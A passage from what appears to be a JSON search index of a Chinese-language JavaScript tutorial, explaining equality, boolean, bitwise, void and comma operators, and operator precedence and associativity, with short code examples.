true</code></pre><p><strong>（4）相等运算符的缺点</strong></p>\n<p>相等运算符隐藏的类型转换，会带来一些违反直觉的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 == &#039;&#039;             // true\n0 == &#039;0&#039;            // true\n\n2 == true           // false\n2 == false          // false\n\nfalse == &#039;false&#039;    // false\nfalse == &#039;0&#039;        // true\n\nfalse == undefined  // false\nfalse == null       // false\nnull == undefined   // true\n\n&#039; \\t\\r\\n &#039; == 0     // true</code></pre><p>上面这些表达式都不同于直觉，很容易出错。因此建议不要使用相等运算符（<code>==</code>），最好只使用严格相等运算符（<code>===</code>）。</p>\n\n        <h2>\n            <a href='#不相等运算符' class='header-anchor'>#</a>\n            <span>不相等运算符</span>\n        </h2>\n    <p>相等运算符有一个对应的“不相等运算符”（<code>!=</code>），它的算法就是先求相等运算符的结果，然后返回相反值。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 != &#039;1&#039; // false\n\n// 等同于\n!(1 == &#039;1&#039;)</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"布尔运算符","link":"/operators/boolean.html"}],"content":"\n        <h1>\n            <a href='#布尔运算符' class='header-anchor'>#</a>\n            <span>布尔运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>布尔运算符用于将表达式转为布尔值，一共包含四个运算符。</p>\n<ul>\n<li>取反运算符：<code>!</code></li>\n<li>且运算符：<code>&amp;&amp;</code></li>\n<li>或运算符：<code>||</code></li>\n<li>三元运算符：<code>?:</code></li>\n</ul>\n\n        <h2>\n            <a href='#取反运算符（!）' class='header-anchor'>#</a>\n            <span>取反运算符（!）</span>\n        </h2>\n    <p>取反运算符是一个感叹号，用于将布尔值变为相反值，即<code>true</code>变成<code>false</code>，<code>false</code>变成<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>!true // false\n!false // true</code></pre><p>对于非布尔值，取反运算符会将其转为布尔值。可以这样记忆，以下六个值取反后为<code>true</code>，其他值都为<code>false</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>false</code></li>\n<li><code>0</code></li>\n<li><code>NaN</code></li>\n<li>空字符串（<code>&#39;&#39;</code>）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>!undefined // true\n!null // true\n!0 // true\n!NaN // true\n!&quot;&quot; // true\n\n!54 // false\n!&#039;hello&#039; // false\n![] // false\n!{} // false</code></pre><p>上面代码中，不管什么类型的值，经过取反运算后，都变成了布尔值。</p>\n<p>如果对一个值连续做两次取反运算，等于将其转为对应的布尔值，与<code>Boolean</code>函数的作用相同。这是一种常用的类型转换的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>!!x\n// 等同于\nBoolean(x)</code></pre><p>上面代码中，不管<code>x</code>是什么类型的值，经过两次取反运算后，变成了与<code>Boolean</code>函数结果相同的布尔值。所以，两次取反就是将一个值转为布尔值的简便写法。</p>\n\n        <h2>\n            <a href='#且运算符（&&）' class='header-anchor'>#</a>\n            <span>且运算符（&amp;&amp;）</span>\n        </h2>\n    <p>且运算符（<code>&amp;&amp;</code>）往往用于多个表达式的求值。</p>\n<p>它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为<code>false</code>，则直接返回第一个运算子的值，且不再对第二个运算子求值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; &amp;&amp; &#039;&#039; // &quot;&quot;\n&#039;t&#039; &amp;&amp; &#039;f&#039; // &quot;f&quot;\n&#039;t&#039; &amp;&amp; (1 + 2) // 3\n&#039;&#039; &amp;&amp; &#039;f&#039; // &quot;&quot;\n&#039;&#039; &amp;&amp; &#039;&#039; // &quot;&quot;\n\nvar x = 1;\n(1 - 1) &amp;&amp; ( x += 1) // 0\nx // 1</code></pre><p>上面代码的最后一个例子，由于且运算符的第一个运算子的布尔值为<code>false</code>，则直接返回它的值<code>0</code>，而不再对第二个运算子求值，所以变量<code>x</code>的值没变。</p>\n<p>这种跳过第二个运算子的机制，被称为“短路”。有些程序员喜欢用它取代<code>if</code>结构，比如下面是一段<code>if</code>结构的代码，就可以用且运算符改写。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (i) {\n  doSomething();\n}\n\n// 等价于\n\ni &amp;&amp; doSomething();</code></pre><p>上面代码的两种写法是等价的，但是后一种不容易看出目的，也不容易除错，建议谨慎使用。</p>\n<p>且运算符可以多个连用，这时返回第一个布尔值为<code>false</code>的表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>true &amp;&amp; &#039;foo&#039; &amp;&amp; &#039;&#039; &amp;&amp; 4 &amp;&amp; &#039;foo&#039; &amp;&amp; true\n// &#039;&#039;</code></pre><p>上面代码中，第一个布尔值为<code>false</code>的表达式为第三个表达式，所以得到一个空字符串。</p>\n\n        <h2>\n            <a href='#或运算符（||）' class='header-anchor'>#</a>\n            <span>或运算符（||）</span>\n        </h2>\n    <p>或运算符（<code>||</code>）也用于多个表达式的求值。它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第一个运算子的值，且不再对第二个运算子求值；如果第一个运算子的布尔值为<code>false</code>，则返回第二个运算子的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; || &#039;&#039; // &quot;t&quot;\n&#039;t&#039; || &#039;f&#039; // &quot;t&quot;\n&#039;&#039; || &#039;f&#039; // &quot;f&quot;\n&#039;&#039; || &#039;&#039; // &quot;&quot;</code></pre><p>短路规则对这个运算符也适用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\ntrue || (x = 2) // true\nx // 1</code></pre><p>上面代码中，且运算符的第一个运算子为<code>true</code>，所以直接返回<code>true</code>，不再运行第二个运算子。所以，<code>x</code>的值没有改变。这种只通过第一个表达式的值，控制是否运行第二个表达式的机制，就称为“短路”（short-cut）。</p>\n<p>或运算符可以多个连用，这时返回第一个布尔值为<code>true</code>的表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>false || 0 || &#039;&#039; || 4 || &#039;foo&#039; || true\n// 4</code></pre><p>上面代码中第一个布尔值为<code>true</code>的表达式是第四个表达式，所以得到数值4。</p>\n<p>或运算符常用于为一个变量设置默认值。</p>\n<pre class=\"prettyprint language-javascript\"><code>function saveText(text) {\n  text = text || &#039;&#039;;\n  // ...\n}\n\n// 或者写成\nsaveText(this.text || &#039;&#039;)</code></pre><p>上面代码表示，如果函数调用时，没有提供参数，则该参数默认设置为空字符串。</p>\n\n        <h2>\n            <a href='#三元条件运算符（?:）' class='header-anchor'>#</a>\n            <span>三元条件运算符（?:）</span>\n        </h2>\n    <p>三元条件运算符由问号（?）和冒号（:）组成，分隔三个表达式。它是 JavaScript 语言唯一一个需要三个运算子的运算符。如果第一个表达式的布尔值为<code>true</code>，则返回第二个表达式的值，否则返回第三个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; ? &#039;hello&#039; : &#039;world&#039; // &quot;hello&quot;\n0 ? &#039;hello&#039; : &#039;world&#039; // &quot;world&quot;</code></pre><p>上面代码的<code>t</code>和<code>0</code>的布尔值分别为<code>true</code>和<code>false</code>，所以分别返回第二个和第三个表达式的值。</p>\n<p>通常来说，三元条件表达式与<code>if...else</code>语句具有同样表达效果，前者可以表达的，后者也能表达。但是两者具有一个重大差别，<code>if...else</code>是语句，没有返回值；三元条件表达式是表达式，具有返回值。所以，在需要返回值的场合，只能使用三元条件表达式，而不能使用<code>if..else</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(true ? &#039;T&#039; : &#039;F&#039;);</code></pre><p>上面代码中，<code>console.log</code>方法的参数必须是一个表达式，这时就只能使用三元条件表达式。如果要用<code>if...else</code>语句，就必须改变整个代码写法了。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"二进制位运算符","link":"/operators/bit.html"}],"content":"\n        <h1>\n            <a href='#二进制位运算符' class='header-anchor'>#</a>\n            <span>二进制位运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>二进制位运算符用于直接对二进制位进行计算，一共有7个。</p>\n<ul>\n<li><strong>二进制或运算符</strong>（or）：符号为<code>|</code>，表示若两个二进制位都为<code>0</code>，则结果为<code>0</code>，否则为<code>1</code>。</li>\n<li><strong>二进制与运算符</strong>（and）：符号为<code>&amp;</code>，表示若两个二进制位都为1，则结果为1，否则为0。</li>\n<li><strong>二进制否运算符</strong>（not）：符号为<code>~</code>，表示对一个二进制位取反。</li>\n<li><strong>异或运算符</strong>（xor）：符号为<code>^</code>，表示若两个二进制位不相同，则结果为1，否则为0。</li>\n<li><strong>左移运算符</strong>（left shift）：符号为<code>&lt;&lt;</code>，详见下文解释。</li>\n<li><strong>右移运算符</strong>（right shift）：符号为<code>&gt;&gt;</code>，详见下文解释。</li>\n<li><strong>带符号位的右移运算符</strong>（zero filled right shift）：符号为<code>&gt;&gt;&gt;</code>，详见下文解释。</li>\n</ul>\n<p>这些位运算符直接处理每一个比特位（bit），所以是非常底层的运算，好处是速度极快，缺点是很不直观，许多场合不能使用它们，否则会使代码难以理解和查错。</p>\n<p>有一点需要特别注意，位运算符只对整数起作用，如果一个运算子不是整数，会自动转为整数后再执行。另外，虽然在 JavaScript 内部，数值都是以64位浮点数的形式储存，但是做位运算的时候，是以32位带符号的整数进行运算的，并且返回值也是一个32位带符号的整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>i = i | 0;</code></pre><p>上面这行代码的意思，就是将<code>i</code>（不管是整数或小数）转为32位整数。</p>\n<p>利用这个特性，可以写出一个函数，将任意数值转为32位整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function toInt32(x) {\n  return x | 0;\n}</code></pre><p>上面这个函数将任意值与<code>0</code>进行一次或运算，这个位运算会自动将一个值转为32位整数。下面是这个函数的用法。</p>\n<pre class=\"prettyprint language-javascript\"><code>toInt32(1.001) // 1\ntoInt32(1.999) // 1\ntoInt32(1) // 1\ntoInt32(-1) // -1\ntoInt32(Math.pow(2, 32) + 1) // 1\ntoInt32(Math.pow(2, 32) - 1) // -1</code></pre><p>上面代码中，<code>toInt32</code>可以将小数转为整数。对于一般的整数，返回值不会有任何变化。对于大于2的32次方的整数，大于32位的数位都会被舍去。</p>\n\n        <h2>\n            <a href='#二进制或运算符' class='header-anchor'>#</a>\n            <span>二进制或运算符</span>\n        </h2>\n    <p>二进制或运算符（<code>|</code>）逐位比较两个运算子，两个二进制位之中只要有一个为<code>1</code>，就返回<code>1</code>，否则返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 | 3 // 3</code></pre><p>上面代码中，<code>0</code>和<code>3</code>的二进制形式分别是<code>00</code>和<code>11</code>，所以进行二进制或运算会得到<code>11</code>（即<code>3</code>）。</p>\n<p>位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与<code>0</code>进行二进制或运算，等同于对该数去除小数部分，即取整数位。</p>\n<pre class=\"prettyprint language-javascript\"><code>2.9 | 0 // 2\n-2.9 | 0 // -2</code></pre><p>需要注意的是，这种取整方法不适用超过32位整数最大值<code>2147483647</code>的数。</p>\n<pre class=\"prettyprint language-javascript\"><code>2147483649.4 | 0;\n// -2147483647</code></pre>\n        <h2>\n            <a href='#二进制与运算符' class='header-anchor'>#</a>\n            <span>二进制与运算符</span>\n        </h2>\n    <p>二进制与运算符（<code>&amp;</code>）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为<code>0</code>，就返回<code>0</code>，否则返回<code>1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 &amp; 3 // 0</code></pre><p>上面代码中，0（二进制<code>00</code>）和3（二进制<code>11</code>）进行二进制与运算会得到<code>00</code>（即<code>0</code>）。</p>\n\n        <h2>\n            <a href='#二进制否运算符' class='header-anchor'>#</a>\n            <span>二进制否运算符</span>\n        </h2>\n    <p>二进制否运算符（<code>~</code>）将每个二进制位都变为相反值（<code>0</code>变为<code>1</code>，<code>1</code>变为<code>0</code>）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。</p>\n<pre class=\"prettyprint language-javascript\"><code>~ 3 // -4</code></pre><p>上面表达式对<code>3</code>进行二进制否运算，得到<code>-4</code>。之所以会有这样的结果，是因为位运算时，JavaScirpt 内部将所有的运算子都转为32位的二进制整数再进行运算。</p>\n<p><code>3</code>的32位整数形式是<code>00000000000000000000000000000011</code>，二进制否运算以后得到<code>11111111111111111111111111111100</code>。由于第一位（符号位）是1，所以这个数是一个负数。JavaScript 内部采用补码形式表示负数，即需要将这个数减去1，再取一次反，然后加上负号，才能得到这个负数对应的10进制值。这个数减去1等于<code>11111111111111111111111111111011</code>，再取一次反得到<code>00000000000000000000000000000100</code>，再加上负号就是<code>-4</code>。考虑到这样的过程比较麻烦，可以简单记忆成，一个数与自身的取反值相加，等于-1。</p>\n<pre class=\"prettyprint language-javascript\"><code>~ -3 // 2</code></pre><p>上面表达式可以这样算，<code>-3</code>的取反值等于<code>-1</code>减去<code>-3</code>，结果为<code>2</code>。</p>\n<p>对一个整数连续两次二进制否运算，得到它自身。</p>\n<pre class=\"prettyprint language-javascript\"><code>~~3 // 3</code></pre><p>所有的位运算都只对整数有效。二进制否运算遇到小数时，也会将小数部分舍去，只保留整数部分。所以，对一个小数连续进行两次二进制否运算，能达到取整效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>~~2.9 // 2\n~~47.11 // 47\n~~1.9999 // 1\n~~3 // 3</code></pre><p>使用二进制否运算取整，是所有取整方法中最快的一种。</p>\n<p>对字符串进行二进制否运算，JavaScript 引擎会先调用<code>Number</code>函数，将字符串转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 相当于~Number(&#039;011&#039;)\n~&#039;011&#039;  // -12\n\n// 相当于~Number(&#039;42 cats&#039;)\n~&#039;42 cats&#039; // -1\n\n// 相当于~Number(&#039;0xcafebabe&#039;)\n~&#039;0xcafebabe&#039; // 889275713\n\n// 相当于~Number(&#039;deadbeef&#039;)\n~&#039;deadbeef&#039; // -1</code></pre><p><code>Number</code>函数将字符串转为数值的规则，参见《数据的类型转换》一章。</p>\n<p>对于其他类型的值，二进制否运算也是先用<code>Number</code>转为数值，然后再进行处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 相当于 ~Number([])\n~[] // -1\n\n// 相当于 ~Number(NaN)\n~NaN // -1\n\n// 相当于 ~Number(null)\n~null // -1</code></pre>\n        <h2>\n            <a href='#异或运算符' class='header-anchor'>#</a>\n            <span>异或运算符</span>\n        </h2>\n    <p>异或运算（<code>^</code>）在两个二进制位不同时返回<code>1</code>，相同时返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 ^ 3 // 3</code></pre><p>上面表达式中，<code>0</code>（二进制<code>00</code>）与<code>3</code>（二进制<code>11</code>）进行异或运算，它们每一个二进制位都不同，所以得到<code>11</code>（即<code>3</code>）。</p>\n<p>“异或运算”有一个特殊运用，连续对两个数<code>a</code>和<code>b</code>进行三次异或运算，<code>a^=b; b^=a; a^=b;</code>，可以<a href=\"http://en.wikipedia.org/wiki/XOR_swap_algorithm\">互换</a>它们的值。这意味着，使用“异或运算”可以在不引入临时变量的前提下，互换两个变量的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 10;\nvar b = 99;\n\na ^= b, b ^= a, a ^= b;\n\na // 99\nb // 10</code></pre><p>这是互换两个变量的值的最快方法。</p>\n<p>异或运算也可以用来取整。</p>\n<pre class=\"prettyprint language-javascript\"><code>12.9 ^ 0 // 12</code></pre>\n        <h2>\n            <a href='#左移运算符' class='header-anchor'>#</a>\n            <span>左移运算符</span>\n        </h2>\n    <p>左移运算符（<code>&lt;&lt;</code>）表示将一个数的二进制值向左移动指定的位数，尾部补<code>0</code>，即乘以<code>2</code>的指定次方。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 4 的二进制形式为100，\n// 左移一位为1000（即十进制的8）\n// 相当于乘以2的1次方\n4 &lt;&lt; 1\n// 8\n\n-4 &lt;&lt; 1\n// -8</code></pre><p>上面代码中，<code>-4</code>左移一位得到<code>-8</code>，是因为<code>-4</code>的二进制形式是<code>11111111111111111111111111111100</code>，左移一位后得到<code>11111111111111111111111111111000</code>，该数转为十进制（减去1后取反，再加上负号）即为<code>-8</code>。</p>\n<p>如果左移0位，就相当于将该数值转为32位整数，等同于取整，对于正数和负数都有效。</p>\n<pre class=\"prettyprint language-javascript\"><code>13.5 &lt;&lt; 0\n// 13\n\n-13.5 &lt;&lt; 0\n// -13</code></pre><p>左移运算符用于二进制数值非常方便。</p>\n<pre class=\"prettyprint language-javascript\"><code>var color = {r: 186, g: 218, b: 85};\n\n// RGB to HEX\n// (1 &lt;&lt; 24)的作用为保证结果是6位数\nvar rgb2hex = function(r, g, b) {\n  return &#039;#&#039; + ((1 &lt;&lt; 24) + (r &lt;&lt; 16) + (g &lt;&lt; 8) + b)\n    .toString(16) // 先转成十六进制，然后返回字符串\n    .substr(1);   // 去除字符串的最高位，返回后面六个字符串\n}\n\nrgb2hex(color.r, color.g, color.b)\n// &quot;#bada55&quot;</code></pre><p>上面代码使用左移运算符，将颜色的 RGB 值转为 HEX 值。</p>\n\n        <h2>\n            <a href='#右移运算符' class='header-anchor'>#</a>\n            <span>右移运算符</span>\n        </h2>\n    <p>右移运算符（<code>&gt;&gt;</code>）表示将一个数的二进制值向右移动指定的位数，头部补<code>0</code>，即除以<code>2</code>的指定次方（最高位即符号位不参与移动）。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 &gt;&gt; 1\n// 2\n/*\n// 因为4的二进制形式为 00000000000000000000000000000100，\n// 右移一位得到 00000000000000000000000000000010，\n// 即为十进制的2\n*/\n\n-4 &gt;&gt; 1\n// -2\n/*\n// 因为-4的二进制形式为 11111111111111111111111111111100，\n// 右移一位，头部补1，得到 11111111111111111111111111111110,\n// 即为十进制的-2\n*/</code></pre><p>右移运算可以模拟 2 的整除运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 &gt;&gt; 1\n// 2\n// 相当于 5 / 2 = 2\n\n21 &gt;&gt; 2\n// 5\n// 相当于 21 / 4 = 5\n\n21 &gt;&gt; 3\n// 2\n// 相当于 21 / 8 = 2\n\n21 &gt;&gt; 4\n// 1\n// 相当于 21 / 16 = 1</code></pre>\n        <h2>\n            <a href='#带符号位的右移运算符' class='header-anchor'>#</a>\n            <span>带符号位的右移运算符</span>\n        </h2>\n    <p>带符号位的右移运算符（<code>&gt;&gt;&gt;</code>）表示将一个数的二进制形式向右移动，包括符号位也参与移动，头部补<code>0</code>。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（<code>&gt;&gt;</code>）完全一致，区别主要在于负数。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 &gt;&gt;&gt; 1\n// 2\n\n-4 &gt;&gt;&gt; 1\n// 2147483646\n/*\n// 因为-4的二进制形式为11111111111111111111111111111100，\n// 带符号位的右移一位，得到01111111111111111111111111111110，\n// 即为十进制的2147483646。\n*/</code></pre><p>这个运算实际上将一个值转为32位无符号整数。</p>\n<p>查看一个负整数在计算机内部的储存形式，最快的方法就是使用这个运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>-1 &gt;&gt;&gt; 0 // 4294967295</code></pre><p>上面代码表示，<code>-1</code>作为32位整数时，内部的储存形式使用无符号整数格式解读，值为 4294967295（即<code>(2^32)-1</code>，等于<code>11111111111111111111111111111111</code>）。</p>\n\n        <h2>\n            <a href='#开关作用' class='header-anchor'>#</a>\n            <span>开关作用</span>\n        </h2>\n    <p>位运算符可以用作设置对象属性的开关。</p>\n<p>假定某个对象有四个开关，每个开关都是一个变量。那么，可以设置一个四位的二进制数，它的每个位对应一个开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var FLAG_A = 1; // 0001\nvar FLAG_B = 2; // 0010\nvar FLAG_C = 4; // 0100\nvar FLAG_D = 8; // 1000</code></pre><p>上面代码设置 A、B、C、D 四个开关，每个开关分别占有一个二进制位。</p>\n<p>然后，就可以用二进制与运算检验，当前设置是否打开了指定开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var flags = 5; // 二进制的0101\n\nif (flags &amp; FLAG_C) {\n  // ...\n}\n// 0101 &amp; 0100 =&gt; 0100 =&gt; true</code></pre><p>上面代码检验是否打开了开关<code>C</code>。如果打开，会返回<code>true</code>，否则返回<code>false</code>。</p>\n<p>现在假设需要打开<code>A</code>、<code>B</code>、<code>D</code>三个开关，我们可以构造一个掩码变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var mask = FLAG_A | FLAG_B | FLAG_D;\n// 0001 | 0010 | 1000 =&gt; 1011</code></pre><p>上面代码对<code>A</code>、<code>B</code>、<code>D</code>三个变量进行二进制或运算，得到掩码值为二进制的<code>1011</code>。</p>\n<p>有了掩码，二进制或运算可以确保打开指定的开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags | mask;</code></pre><p>二进制与运算可以将当前设置中凡是与开关设置不一样的项，全部关闭。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags &amp; mask;</code></pre><p>异或运算可以切换（toggle）当前设置，即第一次执行可以得到当前设置的相反值，再执行一次又得到原来的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags ^ mask;</code></pre><p>二进制否运算可以翻转当前设置，即原设置为<code>0</code>，运算后变为<code>1</code>；原设置为<code>1</code>，运算后变为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = ~flags;</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Michal Budzynski, <a href=\"http://michalbe.blogspot.co.uk/2013/03/javascript-less-known-parts-bitwise.html\">JavaScript: The less known parts. Bitwise Operators</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/06/basic-javascript.html\">Basic JavaScript for the impatient programmer</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators\">Bitwise Operators</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"其他运算符，运算顺序","link":"/operators/priority.html"}],"content":"\n        <h1>\n            <a href='#其他运算符，运算顺序' class='header-anchor'>#</a>\n            <span>其他运算符，运算顺序</span>\n        </h1>\n    \n        <h2>\n            <a href='#void-运算符' class='header-anchor'>#</a>\n            <span>void 运算符</span>\n        </h2>\n    <p><code>void</code>运算符的作用是执行一个表达式，然后不返回任何值，或者说返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>void 0 // undefined\nvoid(0) // undefined</code></pre><p>上面是<code>void</code>运算符的两种写法，都正确。建议采用后一种形式，即总是使用圆括号。因为<code>void</code>运算符的优先性很高，如果不使用括号，容易造成错误的结果。比如，<code>void 4 + 7</code>实际上等同于<code>(void 4) + 7</code>。</p>\n<p>下面是<code>void</code>运算符的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvoid (x = 5) //undefined\nx // 5</code></pre><p>这个运算符的主要用途是浏览器的书签工具（bookmarklet），以及在超级链接中插入代码防止网页跳转。</p>\n<p>请看下面的代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script&gt;\nfunction f() {\n  console.log(&#039;Hello World&#039;);\n}\n&lt;/script&gt;\n&lt;a href=&quot;http://example.com&quot; onclick=&quot;f(); return false;&quot;&gt;点击&lt;/a&gt;</code></pre><p>上面代码中，点击链接后，会先执行<code>onclick</code>的代码，由于<code>onclick</code>返回<code>false</code>，所以浏览器不会跳转到 example.com。</p>\n<p><code>void</code>运算符可以取代上面的写法。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: void(f())&quot;&gt;文字&lt;/a&gt;</code></pre><p>下面是一个更实际的例子，用户点击链接提交表单，但是不产生页面跳转。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: void(document.form.submit())&quot;&gt;\n  提交\n&lt;/a&gt;</code></pre>\n        <h2>\n            <a href='#逗号运算符' class='header-anchor'>#</a>\n            <span>逗号运算符</span>\n        </h2>\n    <p>逗号运算符用于对两个表达式求值，并返回后一个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039;, &#039;b&#039; // &quot;b&quot;\n\nvar x = 0;\nvar y = (x++, 10);\nx // 1\ny // 10</code></pre><p>上面代码中，逗号运算符返回后一个表达式的值。</p>\n<p>逗号运算符的一个用途是，在返回一个值之前，进行一些辅助操作。</p>\n<pre class=\"prettyprint language-javascript\"><code>var value = (console.log(&#039;Hi!&#039;), true);\n// Hi!\n\nvalue // true</code></pre><p>上面代码中，先执行逗号之前的操作，然后返回逗号后面的值。</p>\n\n        <h2>\n            <a href='#运算顺序' class='header-anchor'>#</a>\n            <span>运算顺序</span>\n        </h2>\n    \n        <h3>\n            <a href='#优先级' class='header-anchor'>#</a>\n            <span>优先级</span>\n        </h3>\n    <p>JavaScript 各种运算符的优先级别（Operator Precedence）是不一样的。优先级高的运算符先执行，优先级低的运算符后执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 + 5 * 6 // 34</code></pre><p>上面的代码中，乘法运算符（<code>*</code>）的优先性高于加法运算符（<code>+</code>），所以先执行乘法，再执行加法，相当于下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 + (5 * 6) // 34</code></pre><p>如果多个运算符混写在一起，常常会导致令人困惑的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar arr = [];\n\nvar y = arr.length &lt;= 0 || arr[0] === undefined ? x : arr[0];</code></pre><p>上面代码中，变量<code>y</code>的值就很难看出来，因为这个表达式涉及5个运算符，到底谁的优先级最高，实在不容易记住。</p>\n<p>根据语言规格，这五个运算符的优先级从高到低依次为：小于等于（<code>&lt;=</code>)、严格相等（<code>===</code>）、或（<code>||</code>）、三元（<code>?:</code>）、等号（<code>=</code>）。因此上面的表达式，实际的运算顺序如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var y = ((arr.length &lt;= 0) || (arr[0] === undefined)) ? x : arr[0];</code></pre><p>记住所有运算符的优先级，是非常难的，也是没有必要的。</p>\n\n        <h3>\n            <a href='#圆括号的作用' class='header-anchor'>#</a>\n            <span>圆括号的作用</span>\n        </h3>\n    <p>圆括号（<code>()</code>）可以用来提高运算的优先级，因为它的优先级是最高的，即圆括号中的表达式会第一个运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>(4 + 5) * 6 // 54</code></pre><p>上面代码中，由于使用了圆括号，加法会先于乘法执行。</p>\n<p>运算符的优先级别十分繁杂，且都是硬性规定，因此建议总是使用圆括号，保证运算顺序清晰可读，这对代码的维护和除错至关重要。</p>\n<p>顺便说一下，圆括号不是运算符，而是一种语法结构。它一共有两种用法：一种是把表达式放在圆括号之中，提升运算的优先级；另一种是跟在函数的后面，作用是调用函数。</p>\n<p>注意，因为圆括号不是运算符，所以不具有求值作用，只改变运算的优先级。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n(x) = 2;</code></pre><p>上面代码的第二行，如果圆括号具有求值作用，那么就会变成<code>1 = 2</code>，这是会报错了。但是，上面的代码可以运行，这验证了圆括号只改变优先级，不会求值。</p>\n<p>这也意味着，如果整个表达式都放在圆括号之中，那么不会有任何效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>(exprssion)\n// 等同于\nexpression</code></pre><p>函数放在圆括号中，会返回函数本身。如果圆括号紧跟在函数的后面，就表示调用函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  return 1;\n}\n\n(f) // function f(){return 1;}\nf() // 1</code></pre><p>上面代码中，函数放在圆括号之中会返回函数本身，圆括号跟在函数后面则是调用函数。</p>\n<p>圆括号之中，只能放置表达式，如果将语句放在圆括号之中，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>(var a = 1)\n// SyntaxError: Unexpected token var</code></pre>\n        <h3>\n            <a href='#左结合与右结合' class='header-anchor'>#</a>\n            <span>左结合与右结合</span>\n        </h3>\n    <p>对于优先级别相同的运算符，大多数情况，计算顺序总是从左到右，这叫做运算符的“左结合”（left-to-right associativity），即从左边开始计算。</p>\n<pre class=\"prettyprint language-javascript\"><code>x + y + z</code></pre><p>上面代码先计算最左边的<code>x</code>与<code>y</code>的和，然后再计算与<code>z</code>的和。</p>\n<p>但是少数运算符的计算顺序是从右到左，即从右边开始计算，这叫做运算符的“右结合”（right-to-left associativity）。其中，最主要的是赋值运算符（<code>=</code>）和三元条件运算符（<code>?:</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>w = x = y = z;\nq = a ? b : c ? d : e ? f : g;</code></pre><p>上面代码的运算结果，相当于下面的样子。</p>\n<pre class=\"prettyprint language-javascript\"><code>w = (x = (y = z));\nq = a ? b : (c ? d : (e ? f : g));</code></pre><p>上面的两行代码，各有三个等号运算符和三个三元运算符，都是先计算最右边的那个运算符。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"数据类型的转换","link":"/features/conversion.html"}],"content":"\n        <h1>\n            <a href='#数据类型的转换' class='header-anchor'>#</a>\n            <span>数据类型的转换</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 